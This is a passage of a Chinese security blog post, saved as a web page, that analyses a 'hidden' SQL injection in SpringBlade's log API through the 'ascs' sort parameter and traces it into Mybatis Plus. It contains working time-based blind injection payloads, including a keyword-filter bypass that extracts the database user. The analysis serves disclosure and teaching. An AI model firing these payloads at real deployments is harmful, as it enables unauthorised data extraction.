@@ -1,0 +1,379 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <title>
+    SpringBlade中“隐藏”的SQL注入 |
+    
+    Seikei&#39;s Blog</title>
+  
+    <link rel="shortcut icon" href="/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<script src="/js/pace.min.js"></script>
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body>
+<main class="content">
+  <section class="outer">
+  <article id="post-SpringBlade_SQLi" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
+    
+    <div class="article-inner">
+        
+            <header class="article-header">
+                
+  
+    <h1 class="article-title" itemprop="name">
+      SpringBlade中“隐藏”的SQL注入
+    </h1>
+  
+  
+
+
+
+
+            </header>
+            
+
+                
+                    <div class="article-meta">
+                        <a href="/2020/08/01/SpringBlade_SQLi/" class="article-date">
+  <time datetime="2020-07-31T16:00:00.000Z" itemprop="datePublished">2020-08-01</time>
+</a>
+                            
+                    </div>
+                    
+
+                        
+                            
+    <div class="tocbot"></div>
+
+
+
+
+
+                                
+
+                                    <div class="article-entry" itemprop="articleBody">
+                                        
+
+
+                                            
+
+                                                
+                                                                    <h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>某人在SpringBlade中提了一个<a href="https://github.com/chillzhuang/SpringBlade/issues/9" target="_blank" rel="noopener">issue</a>说明项目存在SQL注入漏洞</p>
+<p>这个项目在我之前分析网关的未授权访问时就看了一遍SQL语句，在<code>*mapper.xml</code>中看了一圈并没有发现注入点，但是看到有人提出了SQL注入于是决定深入探查一下该SQL注入原因。</p>
+<p>如果你看到这篇文章，可以自己尝试阅读代码，看能否找到注入点。如果能自己独立找到，那么这篇文章也就不必往下看了。</p>
+<a id="more"></a>
+
+<h1 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h1><p><a href="https://github.com/chillzhuang/SpringBlade/issues/9" target="_blank" rel="noopener">issue</a>中提到注入点URL为<code>/api/blade-log/api/list?ascs=time and ascii(substring(user() from 1))=97</code></p>
+<p>找到对应的代码文件路径<code>SpringBlade/blade-service/blade-log/src/main/java/org/springblade/core/log/controller/LogApiController.java</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//LogApiController.java</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@GetMapping</span>(<span class="string">"/list"</span>)</span><br><span class="line"><span class="keyword">public</span> R&lt;IPage&lt;LogApiVo&gt;&gt; list(<span class="meta">@ApiIgnore</span> <span class="meta">@RequestParam</span> Map&lt;String, Object&gt; log, Query query) &#123;</span><br><span class="line">	IPage&lt;LogApi&gt; pages = logService.page(Condition.getPage(query.setDescs(<span class="string">"create_time"</span>)), Condition.getQueryWrapper(log, LogApi<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">	List&lt;LogApiVo&gt; records = pages.getRecords().stream().map(logApi -&gt; &#123;</span><br><span class="line">		LogApiVo vo = BeanUtil.copy(logApi, LogApiVo<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">		vo.setStrId(Func.toStr(logApi.getId()));</span><br><span class="line">		<span class="keyword">return</span> vo;</span><br><span class="line">	&#125;).collect(Collectors.toList());</span><br><span class="line">	IPage&lt;LogApiVo&gt; pageVo = <span class="keyword">new</span> Page&lt;&gt;(pages.getCurrent(), pages.getSize(), pages.getTotal());</span><br><span class="line">	pageVo.setRecords(records);</span><br><span class="line">	<span class="keyword">return</span> R.data(pageVo);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>注意传入<code>list</code>方法中的<code>Query</code>，<code>Query</code>是组件自带的类，其中有四个值（<code>current</code>、<code>size</code>、<code>ascs</code>、<code>descs</code>）是可以通过前端用户传入进行赋值的。<code>current</code>和<code>size</code>是integer类型，只能传入数字，无法进行SQL注入，<code>ascs</code>和<code>descs</code>则是string类型，可以传入任意字符。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Query.java</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@Accessors</span>(chain = <span class="keyword">true</span>)</span><br><span class="line"><span class="meta">@ApiModel</span>(description = <span class="string">"查询条件"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Query</span> </span>&#123;</span><br><span class="line">	<span class="meta">@ApiModelProperty</span>(value = <span class="string">"当前页"</span>)</span><br><span class="line">	<span class="keyword">private</span> Integer current;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@ApiModelProperty</span>(value = <span class="string">"每页的数量"</span>)</span><br><span class="line">	<span class="keyword">private</span> Integer size;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@ApiModelProperty</span>(hidden = <span class="keyword">true</span>)</span><br><span class="line">	<span class="keyword">private</span> String ascs;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@ApiModelProperty</span>(hidden = <span class="keyword">true</span>)</span><br><span class="line">	<span class="keyword">private</span> String descs;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>例如传入<code>/api/list?current=7&amp;size=77&amp;ascs=seikei&amp;descs=s31k31</code>时，<code>query</code>中参数分别被赋值成<code>Query(current=7, size=77, ascs=seikei, descs=create_time)</code></p>
+<p>调试过程中<code>query</code>中的变量如下</p>
+<p><img src="/2020/08/01/SpringBlade_SQLi/query-variables.png" alt="query-variables"></p>
+<p>回到<code>list</code>方法，其中第二行，将<code>query</code>传入<code>Condition</code>，其中<code>query.setDescs</code>被设置为<code>create_time</code>，所以descs参数就不可控了</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IPage&lt;LogApi&gt; pages = logService.page(Condition.getPage(query.setDescs(<span class="string">"create_time"</span>)), Condition.getQueryWrapper(log, LogApi<span class="class">.<span class="keyword">class</span>))</span>;</span><br></pre></td></tr></table></figure>
+
+<p>调试追到<code>Condition</code>中可以看到<code>query</code>的值，<code>descs</code>被置为<code>create_time</code>，ascs还是我们传入的值</p>
+<p><img src="/2020/08/01/SpringBlade_SQLi/condition-query.png" alt="condition-query"></p>
+<p><code>Condition.IPage()</code>方法中第二、三行有个<code>SqlKeyword.filter()</code>，其中过滤了一些常见的SQL注入关键字，但是非常容易绕过</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">filter</span><span class="params">(String param)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> param == <span class="keyword">null</span> ? <span class="keyword">null</span> : param.replaceAll(<span class="string">"(?i)'|%|--|insert|delete|select|count|group|union|drop|truncate|alter|grant|execute|exec|xp_cmdshell|call|declare|sql"</span>, <span class="string">""</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><code>Condition</code>被赋值之后到<code>logService.page()</code>，追到LogAPIService，<code>SpringBlade/blade-service/blade-log/src/main/java/org/springblade/core/log/service/impl/LogApiServiceImpl.java</code></p>
+<p>但是service中没有任何内容</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LogApiServiceImpl</span> <span class="keyword">extends</span> <span class="title">ServiceImpl</span>&lt;<span class="title">LogApiMapper</span>, <span class="title">LogApi</span>&gt; <span class="keyword">implements</span> <span class="title">ILogApiService</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>再看看LogApiMapper（<code>SpringBlade/blade-service/blade-log/src/main/java/org/springblade/core/log/mapper/LogApiMapper.java</code>），同样其中也没什么内容</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">LogApiMapper</span> <span class="keyword">extends</span> <span class="title">BaseMapper</span>&lt;<span class="title">LogApi</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>/SpringBlade/blade-service/blade-log/src/main/java/org/springblade/core/log/mapper/LogApiMapper.xml</code></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">mapper</span> <span class="meta-keyword">PUBLIC</span> <span class="meta-string">"-//mybatis.org//DTD Mapper 3.0//EN"</span> <span class="meta-string">"http://mybatis.org/dtd/mybatis-3-mapper.dtd"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mapper</span> <span class="attr">namespace</span>=<span class="string">"org.springblade.core.log.mapper.LogApiMapper"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">&lt;!-- 通用查询映射结果 --&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">resultMap</span> <span class="attr">id</span>=<span class="string">"logResultMap"</span> <span class="attr">type</span>=<span class="string">"org.springblade.core.log.model.LogApi"</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">"id"</span> <span class="attr">property</span>=<span class="string">"id"</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">"create_time"</span> <span class="attr">property</span>=<span class="string">"createTime"</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">"service_id"</span> <span class="attr">property</span>=<span class="string">"serviceId"</span>/&gt;</span></span><br><span class="line">		......</span><br><span class="line">	<span class="tag">&lt;/<span class="name">resultMap</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">&lt;!-- 通用查询结果列 --&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">sql</span> <span class="attr">id</span>=<span class="string">"baseColumnList"</span>&gt;</span></span><br><span class="line">		select id,</span><br><span class="line">		create_time AS createTime,</span><br><span class="line">		service_id, server_host, server_ip, env, type, title, method, request_uri, user_agent, remote_ip, method_class, method_name, params, time, create_by</span><br><span class="line">	<span class="tag">&lt;/<span class="name">sql</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mapper</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>注意其中<code>&lt;sql&gt;</code>标签，其中的语句是没有<code>from</code>和其他内容，仅仅只有<code>select</code>中的内容，没有<code>from</code>，甚至没有参数插入的地方，和常见mybatis配置文件中的SQL语句不一样。</p>
+<p>现在发现SQL语句中并没有插入<code>ascs</code>参数的地方，带着疑问，实际测试来看看是否这里真的存在SQL注入？</p>
+<h1 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h1><p>首先开启mysql的日志记录，方便我们进行测试。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> <span class="keyword">VARIABLES</span> <span class="keyword">LIKE</span> <span class="string">'general%'</span>;   <span class="comment"># 查看日志开启状态和日志存储位置</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">set</span> <span class="keyword">GLOBAL</span> general_log=<span class="string">'ON'</span>;      <span class="comment"># 若未开启日志，也就是general_log为OFF，则设置为ON</span></span><br></pre></td></tr></table></figure>
+
+<p>开启日志后使用<code>tail -f /var/lib/mysql/mysql.log</code>查看mysql日志。</p>
+<p>查看<code>blade_log_api</code>表中是否存在数据，没有的话使用自己随便添加几条数据，方便我们后续测试。</p>
+<blockquote>
+<p><code>blade_log_api</code>表中有数据存在这点是必须的，因为程序使用mybatis plus在真正的SQL执行前会执行<code>SELECT COUNT(1) FROM blade_log_api</code>查看表中是否存在数据，若不存在数据则不会执行真正要执行的SQL。</p>
+</blockquote>
+<br>
+
+<p>我们传入<code>http://localhost:8103/api/list?current=7&amp;size=77&amp;ascs=seikei&amp;descs=s31k31</code>，会在mysql日志中看到如下两条语句被执行</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">COUNT</span>(<span class="number">1</span>) <span class="keyword">FROM</span> blade_log_api</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">id</span>, <span class="keyword">type</span>, title, service_id, server_ip, server_host, env, remote_ip, user_agent, request_uri, method, method_class, method_name, params, <span class="built_in">time</span>, create_by, create_time </span><br><span class="line"><span class="keyword">FROM</span> blade_log_api </span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> seikei <span class="keyword">ASC</span>, create_time <span class="keyword">DESC</span> <span class="keyword">LIMIT</span> <span class="number">462</span>,<span class="number">77</span></span><br></pre></td></tr></table></figure>
+
+<p>可以看到<code>ascs</code>参数是在SQL语句中回显的</p>
+<br>
+
+<p>访问<code>http://localhost:8103/api/list?ascs=time+and+sleep(5)</code>试试注入效果，发现返回延迟了五秒</p>
+<p>数据库日志为：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">id</span>, <span class="keyword">type</span>, title, service_id, server_ip, server_host, env, remote_ip, user_agent, request_uri, method, method_class, method_name, params, <span class="built_in">time</span>, create_by, create_time </span><br><span class="line"><span class="keyword">FROM</span> blade_log_api </span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="built_in">time</span> <span class="keyword">and</span> <span class="keyword">sleep</span>(<span class="number">5</span>) <span class="keyword">ASC</span>, create_time <span class="keyword">DESC</span> <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">10</span></span><br></pre></td></tr></table></figure>
+
+<br>
+
+<p>经过测试，除了<code>SqlKeyword.filter()</code>中过滤的字符，还有不能使用逗号，因为mybatis plus会在每个逗号前添加<code>ASC</code>，导致SQL执行错误。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 传入内容</span><br><span class="line">time RLIKE (SELECT (CASE WHEN (ORD(MID((SELECT IFNULL(CAST(COUNT(DISTINCT(schema_name)) AS NCHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA),1,1))&#x3D;51) THEN 0x74696d65 ELSE 0x28 END))</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; SQL执行内容</span><br><span class="line">time RLIKE (SELECT (CASE WHEN (ORD(MID((SELECT IFNULL(CAST(COUNT(DISTINCT(schema_name)) AS NCHAR) ASC, 0x20) FROM INFORMATION_SCHEMA.SCHEMATA) ASC, 1 ASC, 1))&#x3D;51) THEN 0x74696d65 ELSE 0x28 END)) ASC, create_time DESC LIMIT ?,?</span><br></pre></td></tr></table></figure>
+
+
+
+<p>所以需要使用无逗号的函数进行注入</p>
+<p>判断语句使用：<code>select case when (条件) then 代码1 else 代码2 end</code></p>
+<p>截取字符串使用：<code>select substring(user() from 1 for 4)</code></p>
+<p>只截取一个字符可以省略<code>for</code>，变成<code>substring(user()) from 1</code></p>
+<br>
+
+<p>绕过<code>SqlKeyword.filter()</code>中过滤的字符和逗号，可以使用以下payload（当然还有很多种构造payload的方式，我这里只给出最普通的payload）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ascs&#x3D;(selselectect+case+when(ascii(substring(user()+from+1))%3d114)+then+sleep(2)+end)</span><br></pre></td></tr></table></figure>
+
+<p>更换获取<code>user()</code>的位置，并不断修改ascii的值进行遍历，根据延迟就能得到<code>user()</code>完整的值。</p>
+<br>
+
+<p>来看看issue提交者给出的payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;api&#x2F;blade-log&#x2F;api&#x2F;list?ascs&#x3D;time and ascii(substring(user() from 1))&#x3D;97</span><br></pre></td></tr></table></figure>
+
+<p>payload非常精简，用<code>time</code>字段排序成功与否来看<code>ascii(substring(user() from 1))=97</code>表达式是否正确。若<code>user()</code>第一个字符的ascii码等于97时，返回结果中的<code>time</code>字段是由小到大排序的。</p>
+<p>但这个payload有几个缺陷</p>
+<ul>
+<li>无法广泛适用（需要根据排序值进行判断，编写脚本很难把各种场景做到统一）</li>
+<li>容易误报（若正好结果中<code>time</code>从小到大排序就会产生误报）</li>
+<li>和数据库版本有关（我在mysql8.0.19中测试order by表达式是不生效的，其他数据库暂未测试）</li>
+<li>若是黑盒测试不知道数据库字段名，无法构造payload</li>
+</ul>
+<h1 id="再次分析"><a href="#再次分析" class="headerlink" title="再次分析"></a>再次分析</h1><p>既然能成功注入，那为什么在代码中没有看到相应的SQL语句呢？</p>
+<p>先说结论：Mybatis Plus中已经有写好的分页查询，传入<code>Page</code>和<code>QueryWrapper</code>即可自动构建成SQL语句，而SpringBlade为了灵活加上了多个可变参数，导致用户传入的参数被添加到SQL语句<code>order by</code>之后，导致SQL注入产生。这就是为什么在“可见”的代码中看不到SQL语句拼接，因为压根没用到本地的Mybatis Mapper配置文件中的sql语句。</p>
+<br>
+
+<p>在“可见”的代码中没有找到SQL拼接，我的第一反应就是调用了类库导致的，但是为什么会将用户输入的ascs参数拼接到SQL语句这一点没有弄明白，下面是我个人的分析过程。</p>
+<p>经过一段时间的调试，大概搞懂了整个过程的逻辑，SQL执行前的调用栈如下</p>
+<p><img src="/2020/08/01/SpringBlade_SQLi/debug-mybatis.png" alt="debug-mybatis"></p>
+<p>调用栈中看到，在<code>LogApiServiceImpl#page()</code>方法之后，全部都是在类库中执行的，只看代码是看不出任何SQL拼接迹象的。</p>
+<blockquote>
+<p> ⚠️：若想理解整个过程需要去看<a href="https://github.com/chillzhuang/blade-tool" target="_blank" rel="noopener">SpringBlade Core</a>和<a href="https://github.com/baomidou/mybatis-plus" target="_blank" rel="noopener">Mybatis Plus</a>的源码</p>
+</blockquote>
+<p><code>LogApiController</code>中的<code>logService</code>是<code>ILogApiService</code>类，继承自Mybatis Plus中的<code>IService</code>。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ILogApiService.java</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">ILogApiService</span> <span class="keyword">extends</span> <span class="title">IService</span>&lt;<span class="title">LogApi</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>ILogApiService</code>中是没有重写任何方法的，所以<code>LogApiController</code>中执行的<code>logService.page()</code>最终会调用<code>IService.page()</code>。</p>
+<p><a href="https://github.com/baomidou/mybatis-plus/blob/3.0/mybatis-plus-extension/src/main/java/com/baomidou/mybatisplus/extension/service/IService.java" target="_blank" rel="noopener">IService</a>源码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* 翻页查询</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> page         翻页对象</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> queryWrapper 实体对象封装操作类 &#123;<span class="doctag">@link</span> com.baomidou.mybatisplus.core.conditions.query.QueryWrapper&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">default</span> &lt;E extends IPage&lt;T&gt;&gt; <span class="function">E <span class="title">page</span><span class="params">(E page, Wrapper&lt;T&gt; queryWrapper)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> getBaseMapper().selectPage(page, queryWrapper);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>到了<code>IService.page()</code>之后就是Mybatis Plus内的各种方法调用，以及SQL语句的构造等，不涉及用户传入参数的变更，就不在此赘述，想了解Mybatis Plus的执行过程可以独立分析一下。</p>
+<p>找到执行SQL查询的方法后，就是要查明参数是怎么传入的，我们来看<code>page</code>和<code>queryWrapper</code>。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//LogApiController.java</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@GetMapping</span>(<span class="string">"/list"</span>)</span><br><span class="line"><span class="keyword">public</span> R&lt;IPage&lt;LogApiVo&gt;&gt; list(<span class="meta">@ApiIgnore</span> <span class="meta">@RequestParam</span> Map&lt;String, Object&gt; log, Query query) &#123;</span><br><span class="line">	IPage&lt;LogApi&gt; pages = logService.page(Condition.getPage(query.setDescs(<span class="string">"create_time"</span>)), Condition.getQueryWrapper(log, LogApi<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">	List&lt;LogApiVo&gt; records = pages.getRecords().stream().map(logApi -&gt; &#123;</span><br><span class="line">		LogApiVo vo = BeanUtil.copy(logApi, LogApiVo<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">		vo.setStrId(Func.toStr(logApi.getId()));</span><br><span class="line">		<span class="keyword">return</span> vo;</span><br><span class="line">	&#125;).collect(Collectors.toList());</span><br><span class="line">	IPage&lt;LogApiVo&gt; pageVo = <span class="keyword">new</span> Page&lt;&gt;(pages.getCurrent(), pages.getSize(), pages.getTotal());</span><br><span class="line">	pageVo.setRecords(records);</span><br><span class="line">	<span class="keyword">return</span> R.data(pageVo);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>参数<code>page</code>来自<code>Condition.getPage()</code></p>
+<p>参数<code>queryWrapper</code>来自<code>Condition.getQueryWrapper()</code></p>
+<p>我们再来看<a href="https://github.com/chillzhuang/blade-tool/blob/master/blade-core-mybatis/src/main/java/org/springblade/core/mp/support/Condition.java" target="_blank" rel="noopener">Condition</a>的源码，<code>page</code>是一个Mybatis Plus中的<a href="https://github.com/baomidou/mybatis-plus/blob/3.0/mybatis-plus-extension/src/main/java/com/baomidou/mybatisplus/extension/plugins/pagination/Page.java" target="_blank" rel="noopener">Page</a>类，赋值了传入<code>Query</code>中的四个值（<code>current</code>、<code>size</code>、<code>ascs</code>、<code>descs</code>），<code>Wrapper</code>是一个条件构造器，<code>QueryWrapper</code>则继承自<code>Wrapper</code>，用于构造查询条件。可以把<code>Wrapper</code>理解为SQL的包装器，<code>page</code>则是可插入<code>Wrapper</code>中的数据，如当前页数、排序方式等。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* 转化成mybatis plus中的Page</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> query 查询条件</span></span><br><span class="line"><span class="comment">* <span class="doctag">@return</span> IPage</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; <span class="function">IPage&lt;T&gt; <span class="title">getPage</span><span class="params">(Query query)</span> </span>&#123;</span><br><span class="line">	Page&lt;T&gt; page = <span class="keyword">new</span> Page&lt;&gt;(Func.toInt(query.getCurrent(), <span class="number">1</span>), Func.toInt(query.getSize(), <span class="number">10</span>));</span><br><span class="line">	page.setAsc(Func.toStrArray(SqlKeyword.filter(query.getAscs())));</span><br><span class="line">	page.setDesc(Func.toStrArray(SqlKeyword.filter(query.getDescs())));</span><br><span class="line">	<span class="keyword">return</span> page;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* 获取mybatis plus中的QueryWrapper</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> query 查询条件</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> clazz 实体类</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> &lt;T&gt;   类型</span></span><br><span class="line"><span class="comment">* <span class="doctag">@return</span> QueryWrapper</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; <span class="function">QueryWrapper&lt;T&gt; <span class="title">getQueryWrapper</span><span class="params">(Map&lt;String, Object&gt; query, Class&lt;T&gt; clazz)</span> </span>&#123;</span><br><span class="line">	Kv exclude = Kv.init().set(TokenConstant.HEADER, TokenConstant.HEADER)</span><br><span class="line">		.set(<span class="string">"current"</span>, <span class="string">"current"</span>).set(<span class="string">"size"</span>, <span class="string">"size"</span>).set(<span class="string">"ascs"</span>, <span class="string">"ascs"</span>).set(<span class="string">"descs"</span>, <span class="string">"descs"</span>);</span><br><span class="line">	<span class="keyword">return</span> getQueryWrapper(query, exclude, clazz);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* 获取mybatis plus中的QueryWrapper</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> query   查询条件</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> exclude 排除的查询条件</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> clazz   实体类</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> &lt;T&gt;     类型</span></span><br><span class="line"><span class="comment">* <span class="doctag">@return</span> QueryWrapper</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; <span class="function">QueryWrapper&lt;T&gt; <span class="title">getQueryWrapper</span><span class="params">(Map&lt;String, Object&gt; query, Map&lt;String, Object&gt; exclude, Class&lt;T&gt; clazz)</span> </span>&#123;</span><br><span class="line">	exclude.forEach((k, v) -&gt; query.remove(k));</span><br><span class="line">	QueryWrapper&lt;T&gt; qw = <span class="keyword">new</span> QueryWrapper&lt;&gt;();</span><br><span class="line">	qw.setEntity(BeanUtil.newInstance(clazz));</span><br><span class="line">	SqlKeyword.buildCondition(query, qw);</span><br><span class="line">	